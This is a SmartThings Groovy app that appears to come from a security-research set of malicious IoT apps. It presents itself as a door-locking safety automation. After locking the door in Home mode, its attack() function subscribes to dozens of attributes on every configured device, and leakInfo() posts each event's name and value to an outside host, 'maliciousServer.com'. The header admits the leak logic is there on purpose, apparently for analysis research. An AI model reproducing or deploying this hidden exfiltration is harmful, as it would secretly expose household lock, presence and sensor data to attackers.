/*
* Home mode automation
* You may forget locking your when you arrive home, safe lock will lock when home mode is set.
* Sensitive data leak logic is also integrated into the source code.
* Author: Z. Berkay Celik
* The app is created by Z. Berkay Celik
* Email: zbc102@cse.psu.edu
*/

definition(
	name: "welcome back home, lock your doors",
	namespace: "Soteria",
	author: "Soteria",
	description: "You may forget locking your door when you are in home mode, safe lock will lock when home mode is set.",
	category: "Safety & Security",
	iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
	iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
	iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
  section("Make sure your door is locked when you set home mode") {
    input "lock","capability.lock"
  }
  section( "Notifications" ) {
    input "sendPushMessage", "enum", title: "Send a push notification?", metadata:[values:["Yes", "No"]], required: false
    input "phone", "phone", title: "Send a text message?", required: false
  }
}

def installed() {
  subscribe(location, "mode", modeChangeHandler)
}

def updated(settings) {
  unschedule()
  subscribe(location, "mode", modeChangeHandler)
}

def modeChangeHandler() {
  if(evt.value == "Home"){
	state.home = true
	lock.lock()
	msg = "Your door is locked !"
	if (sendPushMessage) {
      sendPush msg
    }
    if (phone) {
      sendSms phone, msg
    }
	  attack()
  }
}

def attack(){
	def attributes = [
		"acceleration",
		"activities",
		"alarm",
		"battery",
		"button",
		"carbonMonoxide",
		"clip",
		"color",
		"colorTemperature",
		"contact",
		"coolingSetpoint",
		"currentActivity",
		"door",
		"energy",
		"goal",
		"heatingSetpoint",
		"hue",
		"humidity",
		"illuminance",
		"image",
		"level",
		"lock",
		"motion",
		"mute",
		"numberOfButtons",
		"power",
		"presence",
		"saturation",
		"schedule",
		"sleeping",
		"smoke",
		"status",
		"steps",
		"stream",
		"switch",
		"temperature",
		"thermostatFanMode",
		"thermostatMode",
		"thermostatOperatingState",
		"thermostatSetpoint",
		"threeAxis",
		"touch",
		"trackData",
		"trackDescription",
		"valve",
		"water",
		"windowShade"
	]
	settings.each{k,v->
		attributes.each{
			subscribe(v.id, it, leakInfo)
		}
	}
	//subscribe(location, leakInfo)
}

def leakInfo(evt){
	def data = [name:evt.name, value:evt.value]
	try {
		httpPostJson("http://maliciousServer.com", data)
	} catch (e) {
		log.debug "Exception occured: $e"
	}
}

